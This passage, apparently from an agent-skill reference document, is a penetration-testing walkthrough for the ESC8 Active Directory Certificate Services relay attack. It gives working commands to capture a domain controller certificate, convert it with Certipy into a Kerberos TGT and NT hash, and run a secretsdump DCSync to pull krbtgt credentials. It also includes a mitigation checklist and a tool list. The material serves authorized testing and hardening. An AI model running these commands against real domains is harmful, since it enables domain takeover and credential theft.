# relaying-ntlm-for-adcs-esc8 — 详细参考（由 SKILL.md 拆分）

### 4. Capture the issued certificate

When the coerced DC authenticates, `ntlmrelayx` relays it to the CA and prints output similar to:

```
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Base64 certificate of user DC01$:
MIIRXAIBAzCC...<snip>...
```

Save the base64 PKCS#12 blob to a `.pfx` file (decode it; the cert has no export password by default):

```bash
echo 'MIIRXAIBAzCC...<snip>...' | base64 -d > dc01.pfx
```

### 5. Convert the certificate to a TGT and NT hash

Use Certipy to authenticate with the certificate via PKINIT, obtaining a Kerberos TGT and the DC machine-account NT hash:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
```

Certipy outputs a `.ccache` TGT and the NT hash, e.g. `[*] Got hash for 'dc01$@corp.local': aad3b435...:<NTHASH>`.

### 6. Leverage the DC identity (DCSync)

With the DC machine account's hash/TGT, perform DCSync to extract domain credentials (e.g., `krbtgt`, Domain Admins) using the recovered TGT:

```bash
# Use the ccache TGT, then DCSync via secretsdump
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01.corp.local -just-dc-user krbtgt
```

### 7. Validate mitigations (defensive checklist)

Confirm the environment is hardened against ESC8 after testing:

- Enable Extended Protection for Authentication (EPA) on the AD CS web-enrollment IIS site and require HTTPS.
- Disable NTLM on the CA enrollment endpoint; prefer the enrollment proxy with EPA.
- Remove unused HTTP Web Enrollment role services where possible.
- Patch coercion vectors (MS-EFSRPC/PetitPotam, MS-RPRN/printerbug) and restrict RPC.
- Monitor for forced authentication and anomalous machine-account certificate enrollment.

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| Impacket ntlmrelayx | NTLM relay engine with `--adcs` mode | https://github.com/fortra/impacket |
| Certipy | AD CS enumeration and certificate abuse | https://github.com/ly4k/Certipy |
| PetitPotam | MS-EFSRPC coercion | https://github.com/topotam/PetitPotam |
| Coercer | Multi-protocol coercion | https://github.com/p0dalirius/Coercer |
| Certified Pre-Owned (SpecterOps) | Original AD CS abuse research | https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf |
| SpecterOps CoerceAndRelayNTLMToADCS | ESC8 edge reference | https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs |

## Validation Criteria

- [ ] AD CS enumerated and an ESC8-vulnerable web-enrollment endpoint confirmed with `certipy find -vulnerable`.
- [ ] `ntlmrelayx --adcs --template DomainController` listener running against the CA URL.
- [ ] Coercion (PetitPotam/Coercer/printerbug) triggered against the target DC.
- [ ] Base64 certificate for the DC machine account captured and saved as `.pfx`.
- [ ] Certificate converted to a TGT and NT hash with `certipy auth`.
- [ ] Domain compromise validated via DCSync (in scope only).
- [ ] EPA/HTTPS and coercion-patch mitigations verified and documented.
